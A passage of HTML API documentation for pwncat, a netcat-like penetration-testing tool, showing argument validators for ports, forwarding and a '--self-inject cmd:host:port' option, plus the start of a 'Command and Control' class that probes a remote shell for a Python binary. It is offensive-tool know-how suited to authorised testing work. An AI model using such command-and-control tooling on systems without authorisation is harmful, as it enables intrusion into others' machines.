        <span class="hljs-comment"># type: (Optional[str]) -&gt; Optional[str]</span>
        <span class="hljs-string">"""Check argument for valid --crlf value."""</span>
        <span class="hljs-keyword">if</span> value <span class="hljs-keyword">is</span> <span
                                    class="hljs-literal">None</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
        <span class="hljs-keyword">if</span> value.lower() <span
                                    class="hljs-keyword">in</span> [<span
                                    class="hljs-string">"crlf"</span>, <span class="hljs-string">"lf"</span>, <span
                                    class="hljs-string">"cr"</span>, <span
                                    class="hljs-string">"no"</span>]:
            <span class="hljs-keyword">return</span> value.lower()
        <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                                    class="hljs-string">"'%s' is an invalid choice."</span> % value)

<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">type_color</span>(<span
            class="hljs-params">value</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; str</span>
        <span class="hljs-string">"""Check argument for valid --color value."""</span>
        <span class="hljs-keyword">if</span> value <span class="hljs-keyword">not</span> <span
                                    class="hljs-keyword">in</span> [<span
                                    class="hljs-string">"auto"</span>, <span class="hljs-string">"always"</span>, <span
                                    class="hljs-string">"never"</span>]:
            <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                                    class="hljs-string">"%s is an invalid color definition."</span> % value)
        <span class="hljs-keyword">return</span> value

<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">type_local</span>(<span
            class="hljs-params">value</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; str</span>
        <span class="hljs-string">"""Check argument for valid -L/--local value."""</span>
        match = re.search(<span class="hljs-string">r"^(.+:)?([0-9]+)$"</span>, value)
        <span class="hljs-keyword">if</span> match <span class="hljs-keyword">is</span> <span
                                    class="hljs-literal">None</span> <span
                                    class="hljs-keyword">or</span> len(match.groups()) != <span
                                    class="hljs-number">2</span>:
            <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                                    class="hljs-string">"%s is not a valid '[addr:]port' format."</span> % value)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ArgValidator.is_valid_port(int(match.group(<span
                                    class="hljs-number">2</span>))):
            <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                                    class="hljs-string">"%s is not a valid port."</span> % value)

        <span class="hljs-keyword">if</span> match.group(<span class="hljs-number">1</span>) <span
                                    class="hljs-keyword">is</span> <span
                                    class="hljs-literal">None</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">":"</span> + match.group(<span
                                    class="hljs-number">2</span>)
        <span class="hljs-keyword">return</span> value

<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">type_remote</span>(<span
            class="hljs-params">value</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; str</span>
        <span class="hljs-string">"""Check argument for valid -R/--remote value."""</span>
        match = re.search(<span class="hljs-string">r"(.+):(.+)"</span>, value)
        <span class="hljs-keyword">if</span> match <span class="hljs-keyword">is</span> <span
                                    class="hljs-literal">None</span> <span
                                    class="hljs-keyword">or</span> len(match.groups()) != <span
                                    class="hljs-number">2</span>:
            <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                                    class="hljs-string">"%s is not a valid 'addr:port' format."</span> % value)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ArgValidator.is_valid_port(int(match.group(<span
                                    class="hljs-number">2</span>))):
            <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                                    class="hljs-string">"%s is not a valid port."</span> % value)
        <span class="hljs-keyword">return</span> value

<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">type_self_inject</span>(<span
            class="hljs-params">value</span>):</span>
        <span class="hljs-comment"># type: (str) -&gt; str</span>
        <span class="hljs-string">"""Check argument for valid --self-inject value."""</span>
        opts = value.split(<span class="hljs-string">":"</span>)
        <span class="hljs-keyword">if</span> len(opts) != <span class="hljs-number">3</span>:
            <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                                    class="hljs-string">"%s is not a valid cmd:host:port[s] pattern."</span> % value)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ArgValidator.is_valid_port_list(opts[<span
                                    class="hljs-number">-1</span>]):
            <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                                    class="hljs-string">"%s is an invalid port definition."</span> % value)
        <span class="hljs-keyword">return</span> value</code></pre>
                    </details>
                    <h3>Static methods</h3>
                    <dl>
                        <dt id="pwncat.ArgValidator.get_port_list_from_string"><code
                                class="name flex">
                            <span>def <span
                                    class="ident">get_port_list_from_string</span></span>(<span>value)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Returns a list of ports from an comma, range or
                                increment.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@staticmethod</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_port_list_from_string</span>(<span
        class="hljs-params">value</span>):</span>
    <span class="hljs-comment"># type: (str) -&gt; List[int]</span>
    <span class="hljs-string">"""Returns a list of ports from an comma, range or increment."""</span>
    cports = ArgValidator.__get_port_list_by_comma(value)
    rports = ArgValidator.__get_port_list_by_range(value)
    iports = ArgValidator.__get_port_list_by_incr(value)
    <span class="hljs-keyword">return</span> cports + rports + iports</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.ArgValidator.is_valid_port"><code class="name flex">
                            <span>def <span
                                    class="ident">is_valid_port</span></span>(<span>value)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Returns True if a given value is a valid port.</p>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@staticmethod</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_valid_port</span>(<span
        class="hljs-params">value</span>):</span>
    <span class="hljs-comment"># type: (int) -&gt; bool</span>
    <span class="hljs-string">"""Returns True if a given value is a valid port."""</span>
    <span class="hljs-keyword">return</span> <span
                                            class="hljs-number">0</span> &lt; value &lt; <span
                                            class="hljs-number">65536</span></code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.ArgValidator.is_valid_port_list"><code class="name flex">
                            <span>def <span class="ident">is_valid_port_list</span></span>(<span>value)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Returns True if a given value is a valid port list
                                by comma or range.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@staticmethod</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_valid_port_list</span>(<span
        class="hljs-params">value</span>):</span>
    <span class="hljs-comment"># type: (str) -&gt; bool</span>
    <span class="hljs-string">"""Returns True if a given value is a valid port list by comma or range."""</span>
    cports = ArgValidator.__get_port_list_by_comma(value)
    rports = ArgValidator.__get_port_list_by_range(value)
    iports = ArgValidator.__get_port_list_by_incr(value)
    <span class="hljs-comment"># XOR - only one method (comma, range or increment) is allowed</span>
    <span class="hljs-keyword">if</span> cports <span class="hljs-keyword">and</span> <span
                                            class="hljs-keyword">not</span> rports <span
                                            class="hljs-keyword">and</span> <span
                                            class="hljs-keyword">not</span> iports:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
    <span class="hljs-keyword">if</span> rports <span class="hljs-keyword">and</span> <span
                                            class="hljs-keyword">not</span> cports <span
                                            class="hljs-keyword">and</span> <span
                                            class="hljs-keyword">not</span> iports:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
    <span class="hljs-keyword">if</span> iports <span class="hljs-keyword">and</span> <span
                                            class="hljs-keyword">not</span> cports <span
                                            class="hljs-keyword">and</span> <span
                                            class="hljs-keyword">not</span> rports:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.ArgValidator.type_color"><code class="name flex">
                            <span>def <span
                                    class="ident">type_color</span></span>(<span>value)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Check argument for valid color value.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@staticmethod</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">type_color</span>(<span
        class="hljs-params">value</span>):</span>
    <span class="hljs-comment"># type: (str) -&gt; str</span>
    <span class="hljs-string">"""Check argument for valid --color value."""</span>
    <span class="hljs-keyword">if</span> value <span class="hljs-keyword">not</span> <span
                                            class="hljs-keyword">in</span> [<span
                                            class="hljs-string">"auto"</span>, <span
                                            class="hljs-string">"always"</span>, <span
                                            class="hljs-string">"never"</span>]:
        <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                                            class="hljs-string">"%s is an invalid color definition."</span> % value)
    <span class="hljs-keyword">return</span> value</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.ArgValidator.type_crlf"><code class="name flex">
                            <span>def <span
                                    class="ident">type_crlf</span></span>(<span>value)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Check argument for valid crlf value.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@staticmethod</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">type_crlf</span>(<span class="hljs-params">value</span>):</span>
    <span class="hljs-comment"># type: (Optional[str]) -&gt; Optional[str]</span>
    <span class="hljs-string">"""Check argument for valid --crlf value."""</span>
    <span class="hljs-keyword">if</span> value <span class="hljs-keyword">is</span> <span
                                            class="hljs-literal">None</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
    <span class="hljs-keyword">if</span> value.lower() <span class="hljs-keyword">in</span> [<span
                                            class="hljs-string">"crlf"</span>, <span
                                            class="hljs-string">"lf"</span>, <span
                                            class="hljs-string">"cr"</span>, <span
                                            class="hljs-string">"no"</span>]:
        <span class="hljs-keyword">return</span> value.lower()
    <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span class="hljs-string">"'%s' is an invalid choice."</span> % value)</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.ArgValidator.type_file_content"><code class="name flex">
                            <span>def <span class="ident">type_file_content</span></span>(<span>value)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Check argument for valid file content (file must
                                exist and be readable).</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@staticmethod</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">type_file_content</span>(<span
        class="hljs-params">value</span>):</span>
    <span class="hljs-comment"># type: (str) -&gt; str</span>
    <span class="hljs-string">"""Check argument for valid file content (file must exist and be readable)."""</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.isfile(value):
        <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                                            class="hljs-string">"File not found: %s"</span> % value)
    <span class="hljs-keyword">with</span> open(value, mode=<span
                                            class="hljs-string">"r"</span>) <span
                                            class="hljs-keyword">as</span> fhandle:
        script = fhandle.read()
    <span class="hljs-keyword">return</span> script</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.ArgValidator.type_info"><code class="name flex">
                            <span>def <span
                                    class="ident">type_info</span></span>(<span>value)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Check argument for valid info value.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@staticmethod</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">type_info</span>(<span class="hljs-params">value</span>):</span>
    <span class="hljs-comment"># type: (str) -&gt; str</span>
    <span class="hljs-string">"""Check argument for valid --info value."""</span>
    <span class="hljs-keyword">if</span> value <span class="hljs-keyword">not</span> <span
                                            class="hljs-keyword">in</span> [<span
                                            class="hljs-string">"sock"</span>, <span
                                            class="hljs-string">"ipv4"</span>, <span
                                            class="hljs-string">"ipv6"</span>, <span
                                            class="hljs-string">"tcp"</span>, <span
                                            class="hljs-string">"all"</span>, <span
                                            class="hljs-string">""</span>]:
        <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                                            class="hljs-string">"%s is an invalid info definition."</span> % value)
    <span class="hljs-keyword">return</span> value</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.ArgValidator.type_local"><code class="name flex">
                            <span>def <span
                                    class="ident">type_local</span></span>(<span>value)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Check argument for valid -L/local value.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@staticmethod</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">type_local</span>(<span
        class="hljs-params">value</span>):</span>
    <span class="hljs-comment"># type: (str) -&gt; str</span>
    <span class="hljs-string">"""Check argument for valid -L/--local value."""</span>
    match = re.search(<span class="hljs-string">r"^(.+:)?([0-9]+)$"</span>, value)
    <span class="hljs-keyword">if</span> match <span class="hljs-keyword">is</span> <span
                                            class="hljs-literal">None</span> <span
                                            class="hljs-keyword">or</span> len(match.groups()) != <span
                                            class="hljs-number">2</span>:
        <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                                            class="hljs-string">"%s is not a valid '[addr:]port' format."</span> % value)
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ArgValidator.is_valid_port(int(match.group(<span
                                            class="hljs-number">2</span>))):
        <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                                            class="hljs-string">"%s is not a valid port."</span> % value)

    <span class="hljs-keyword">if</span> match.group(<span class="hljs-number">1</span>) <span
                                            class="hljs-keyword">is</span> <span
                                            class="hljs-literal">None</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">":"</span> + match.group(<span
                                            class="hljs-number">2</span>)
    <span class="hljs-keyword">return</span> value</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.ArgValidator.type_port"><code class="name flex">
                            <span>def <span
                                    class="ident">type_port</span></span>(<span>value)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Check argument for valid port.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@staticmethod</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">type_port</span>(<span class="hljs-params">value</span>):</span>
    <span class="hljs-comment"># type: (str) -&gt; int</span>
    <span class="hljs-string">"""Check argument for valid port."""</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ArgValidator.is_valid_port(int(value)):
        <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                                            class="hljs-string">"%s is an invalid port number."</span> % value)
    <span class="hljs-keyword">return</span> int(value)</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.ArgValidator.type_port_list"><code class="name flex">
                            <span>def <span
                                    class="ident">type_port_list</span></span>(<span>value)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Check argument for valid port list separated by
                                comma or range number.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@staticmethod</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">type_port_list</span>(<span
        class="hljs-params">value</span>):</span>
    <span class="hljs-comment"># type: (str) -&gt; List[int]</span>
    <span class="hljs-string">"""Check argument for valid port list separated by comma or range number."""</span>
    rports = ArgValidator.__get_port_list_by_range(value)
    cports = ArgValidator.__get_port_list_by_comma(value)
    iports = ArgValidator.__get_port_list_by_incr(value)

    <span class="hljs-comment"># Only use comma, range or increment!</span>
    <span class="hljs-keyword">if</span> (rports <span class="hljs-keyword">and</span> cports) <span
                                            class="hljs-keyword">or</span> (rports <span
                                            class="hljs-keyword">and</span> iports) <span
                                            class="hljs-keyword">or</span> (cports <span
                                            class="hljs-keyword">and</span> iports):
        <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(
            <span class="hljs-string">"%s is invalid. Can only use comma, range or increment."</span> % value
        )
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> rports <span
                                            class="hljs-keyword">and</span> <span
                                            class="hljs-keyword">not</span> cports <span
                                            class="hljs-keyword">and</span> <span
                                            class="hljs-keyword">not</span> iports:
        <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                                            class="hljs-string">"%s is an invalid port-list/range definition."</span> % value)
    <span class="hljs-comment"># Return whichever has a value</span>
    <span class="hljs-keyword">return</span> rports + cports + iports</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.ArgValidator.type_remote"><code class="name flex">
                            <span>def <span
                                    class="ident">type_remote</span></span>(<span>value)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Check argument for valid -R/remote value.</p>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@staticmethod</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">type_remote</span>(<span
        class="hljs-params">value</span>):</span>
    <span class="hljs-comment"># type: (str) -&gt; str</span>
    <span class="hljs-string">"""Check argument for valid -R/--remote value."""</span>
    match = re.search(<span class="hljs-string">r"(.+):(.+)"</span>, value)
    <span class="hljs-keyword">if</span> match <span class="hljs-keyword">is</span> <span
                                            class="hljs-literal">None</span> <span
                                            class="hljs-keyword">or</span> len(match.groups()) != <span
                                            class="hljs-number">2</span>:
        <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                                            class="hljs-string">"%s is not a valid 'addr:port' format."</span> % value)
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ArgValidator.is_valid_port(int(match.group(<span
                                            class="hljs-number">2</span>))):
        <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                                            class="hljs-string">"%s is not a valid port."</span> % value)
    <span class="hljs-keyword">return</span> value</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.ArgValidator.type_self_inject"><code class="name flex">
                            <span>def <span class="ident">type_self_inject</span></span>(<span>value)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Check argument for valid self-inject value.</p>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@staticmethod</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">type_self_inject</span>(<span
        class="hljs-params">value</span>):</span>
    <span class="hljs-comment"># type: (str) -&gt; str</span>
    <span class="hljs-string">"""Check argument for valid --self-inject value."""</span>
    opts = value.split(<span class="hljs-string">":"</span>)
    <span class="hljs-keyword">if</span> len(opts) != <span class="hljs-number">3</span>:
        <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                                            class="hljs-string">"%s is not a valid cmd:host:port[s] pattern."</span> % value)
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ArgValidator.is_valid_port_list(opts[<span
                                            class="hljs-number">-1</span>]):
        <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                                            class="hljs-string">"%s is an invalid port definition."</span> % value)
    <span class="hljs-keyword">return</span> value</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.ArgValidator.type_tos"><code class="name flex">
                            <span>def <span class="ident">type_tos</span></span>(<span>value)</span>
                        </code></dt>
                        <dd>
                            <div class="desc"><p>Check argument for valid tos value.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@staticmethod</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">type_tos</span>(<span class="hljs-params">value</span>):</span>
    <span class="hljs-comment"># type: (str) -&gt; str</span>
    <span class="hljs-string">"""Check argument for valid --tos value."""</span>
    <span class="hljs-keyword">if</span> value <span class="hljs-keyword">not</span> <span
                                            class="hljs-keyword">in</span> [<span
                                            class="hljs-string">"mincost"</span>, <span
                                            class="hljs-string">"lowcost"</span>, <span
                                            class="hljs-string">"reliability"</span>, <span
                                            class="hljs-string">"throughput"</span>, <span
                                            class="hljs-string">"lowdelay"</span>]:
        <span class="hljs-keyword">raise</span> argparse.ArgumentTypeError(<span
                                            class="hljs-string">"%s is an invalid tos definition."</span> % value)
    <span class="hljs-keyword">return</span> value</code></pre>
                            </details>
                        </dd>
                    </dl>
                </dd>
                <dt id="pwncat.CNC"><code class="flex name class">
                    <span>class <span class="ident">CNC</span></span>
                    <span>(</span><span>network)</span>
                </code></dt>
                <dd>
                    <div class="desc"><p>Command and Control base class.</p>
                        <p>Instantiate Command and Control class.</p>
                        <h2 id="args">Args</h2>
                        <dl>
                            <dt><strong><code>network</code></strong> :<code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.IONetwork"
                                    title="pwncat.IONetwork">IONetwork</a></code>
                            </dt>
                            <dd>Instance of IONetwork</dd>
                        </dl>
                        <h2 id="raises">Raises</h2>
                        <dl>
                            <dt><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.CNCPythonNotFound"
                                    title="pwncat.CNCPythonNotFound">CNCPythonNotFound</a></code>
                            </dt>
                            <dd>if remote Python binary path is not found.</dd>
                        </dl>
                    </div>
                    <details class="source">
                        <summary>
                            <span>Expand source code</span>
                        </summary>
                        <pre><code class="python hljs"><span class="hljs-class"><span
                                class="hljs-keyword">class</span> <span
                                class="hljs-title">CNC</span>(<span
                                class="hljs-params">object</span>):</span>
    <span class="hljs-string">"""Command and Control base class."""</span>

    __PYTHON_PATHS = [
        <span class="hljs-string">"/usr/bin"</span>,
        <span class="hljs-string">"/usr/local/bin"</span>,
        <span class="hljs-string">"/usr/local/python/bin"</span>,
        <span class="hljs-string">"/usr/local/python2/bin"</span>,
        <span class="hljs-string">"/usr/local/python2.7/bin"</span>,
        <span class="hljs-string">"/usr/local/python3/bin"</span>,
        <span class="hljs-string">"/usr/local/python3.5/bin"</span>,
        <span class="hljs-string">"/usr/local/python3.6/bin"</span>,
        <span class="hljs-string">"/usr/local/python3.7/bin"</span>,
        <span class="hljs-string">"/usr/local/python3.8/bin"</span>,
        <span class="hljs-string">"/bin"</span>,
        <span class="hljs-string">"/opt/bin"</span>,
        <span class="hljs-string">"/opt/python/bin"</span>,
        <span class="hljs-string">"/opt/python2/bin"</span>,
        <span class="hljs-string">"/opt/python2.7/bin"</span>,
        <span class="hljs-string">"/opt/python3/bin"</span>,
        <span class="hljs-string">"/opt/python3.5/bin"</span>,
        <span class="hljs-string">"/opt/python3.6/bin"</span>,
        <span class="hljs-string">"/opt/python3.7/bin"</span>,
        <span class="hljs-string">"/opt/python3.8/bin"</span>,
    ]

    __PYTHON_NAMES = [
        <span class="hljs-string">"python3"</span>,
        <span class="hljs-string">"python"</span>,
        <span class="hljs-string">"python2"</span>,
        <span class="hljs-string">"python2.7"</span>,
        <span class="hljs-string">"python3.5"</span>,
        <span class="hljs-string">"python3.6"</span>,
        <span class="hljs-string">"python3.7"</span>,
        <span class="hljs-string">"python3.8"</span>,
    ]

    __COLORS = {<span class="hljs-string">"yellow"</span>: <span
                                    class="hljs-string">"\x1b[33;21m"</span>, <span
                                    class="hljs-string">"reset"</span>: <span class="hljs-string">"\x1b[0m"</span>}

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Properties</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">remote_python</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; str</span>
        <span class="hljs-string">"""Discovered absolute Python remote path."""</span>
        <span class="hljs-keyword">return</span> self.__remote_python

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">remote_py3</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""Is remote version Python3? Else it is Python2."""</span>
        <span class="hljs-keyword">return</span> self.__remote_py3

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, network</span>):</span>
        <span class="hljs-comment"># type: (IONetwork) -&gt; None</span>
        <span class="hljs-string">"""Instantiate Command and Control class.

        Args:
            network (IONetwork): Instance of IONetwork

        Raises:
            CNCPythonNotFound: if remote Python binary path is not found.
        """</span>
        self.__net = network
        self.__log = logging.getLogger(__name__)
        self.__py3 = sys.version_info &gt;= (<span class="hljs-number">3</span>, <span
                                    class="hljs-number">0</span>)  <span class="hljs-comment"># type: bool</span>

        <span class="hljs-comment"># Along with the response the server might prefix/suffix data</span>
        <span class="hljs-comment"># such as a PS1 prompt (which might be send first or last with a newline)</span>
        self.__remote_prefix = []  <span class="hljs-comment"># type: List[bytes]</span>
        self.__remote_suffix = []  <span class="hljs-comment"># type: List[bytes]</span>

        <span class="hljs-comment"># Receive timeout value will be adjusted dynamically depending on the</span>
        <span class="hljs-comment"># speed of the server. We'll start high to allow for slow servers.</span>
        self.__recv_timeout = <span class="hljs-number">0.3</span>
        self.__recv_rounds = <span class="hljs-number">5</span>
        self.__recv_times = []  <span class="hljs-comment"># type: List[float]</span>

        <span class="hljs-comment"># [1/3] Check if there is data to be received first (e.g.: greeting)</span>
        self.print_info(<span class="hljs-string">"Checking if remote sends greeting..."</span>)
        greeting = self.send_recv(<span class="hljs-literal">None</span>, <span
                                    class="hljs-literal">False</span>, <span class="hljs-literal">False</span>)
        <span class="hljs-keyword">if</span> greeting:
            self.print_raw(<span class="hljs-string">b"\n"</span>.join(greeting), <span
                                    class="hljs-literal">True</span>)

        <span class="hljs-comment"># [2/3] Check if the remote sends a prefix with every reply</span>
        self.__set_remote_prefix()

        <span class="hljs-comment"># [3/3] Find potential Python versions</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__set_remote_python_path():
            self.print_info(<span class="hljs-string">"No Python has been found. Aborting and handing over to current shell."</span>)
            <span class="hljs-keyword">raise</span> CNCPythonNotFound()

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Print Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">print_info</span>(<span
            class="hljs-params">self, message=None, newline=True, erase=False</span>):</span>
        <span class="hljs-comment"># type: (Optional[str], bool, bool) -&gt; None</span>
        <span class="hljs-string">"""Print a message to the local screen to inform the user.

        Args:
            message (str): The message to print.
            newline (bool): Add a newline?
            erase (bool): Erase previously printed text on the same line.
        """</span>
        end = <span class="hljs-string">"\n"</span> <span
                                    class="hljs-keyword">if</span> newline <span
                                    class="hljs-keyword">else</span> <span
                                    class="hljs-string">""</span>
        prefix = <span class="hljs-string">"{}[PWNCAT CnC]{} "</span>.format(self.__COLORS[<span
                                    class="hljs-string">"yellow"</span>], self.__COLORS[<span
                                    class="hljs-string">"reset"</span>])
        <span class="hljs-keyword">if</span> message <span class="hljs-keyword">is</span> <span
                                    class="hljs-literal">None</span>:
            message = <span class="hljs-string">""</span>
            prefix = <span class="hljs-string">""</span>

        <span class="hljs-keyword">if</span> erase:
            print(<span class="hljs-string">"\r"</span> * <span
                                    class="hljs-number">1024</span> + <span class="hljs-string">"{}{}"</span>.format(prefix, message), end=end)
            sys.stdout.flush()
        <span class="hljs-keyword">else</span>:
            print(<span class="hljs-string">"{}{}"</span>.format(prefix, message), end=end)
            sys.stdout.flush()

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">print_raw</span>(<span
            class="hljs-params">self, message, newline</span>):</span>
        <span class="hljs-comment"># type: (bytes, bool) -&gt; None</span>
        <span class="hljs-string">"""Print a message to the local screen without color/prefix.

        Args:
            message (bytes): The message to print.
            newline (bool): Add a newline?
        """</span>
        <span class="hljs-keyword">if</span> self.__py3:
            end = <span class="hljs-string">b"\n"</span> <span class="hljs-keyword">if</span> newline <span
                                    class="hljs-keyword">else</span> <span
                                    class="hljs-string">b""</span>
            sys.stdout.buffer.write(<span class="hljs-string">b""</span>.join([message, end]))
        <span class="hljs-keyword">else</span>:
            end = <span class="hljs-string">"\n"</span> <span class="hljs-keyword">if</span> newline <span
                                    class="hljs-keyword">else</span> <span
                                    class="hljs-string">""</span>  <span class="hljs-comment"># type: ignore</span>
            print(message, end=end)  <span class="hljs-comment"># type: ignore</span>

        <span class="hljs-comment"># For issues with flush (when using tail -F or equal) see links below:</span>
        <span class="hljs-comment"># https://stackoverflow.com/questions/26692284</span>
        <span class="hljs-comment"># https://docs.python.org/3/library/signal.html#note-on-sigpipe</span>
        <span class="hljs-keyword">try</span>:
            sys.stdout.flush()
        <span class="hljs-keyword">except</span> IOError:
